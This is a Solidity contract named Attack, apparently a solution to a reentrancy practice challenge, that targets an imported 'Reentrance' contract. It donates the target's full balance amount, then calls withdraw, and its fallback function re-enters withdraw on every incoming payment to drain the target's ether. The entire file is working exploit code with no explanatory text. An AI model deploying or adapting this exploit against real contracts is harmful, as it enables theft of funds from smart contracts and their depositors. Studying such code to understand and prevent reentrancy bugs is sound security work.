pragma solidity ^0.8.0;
import "./ReEntrance.sol";
contract Attack {
    Reentrance re;
    uint public attackAmount;
    event Withdraw(uint amount);
    
    constructor(address payable _re) {
        re = Reentrance(_re);
        attackAmount = address(re).balance;
    }
    fallback() external payable {
        withdraw();
    }
    function attack() public payable {
        re.donate{value: attackAmount}(address(this));
        withdraw();
    }
    function withdraw() internal {
        re.withdraw(attackAmount);
        emit Withdraw(attackAmount);
    }
}
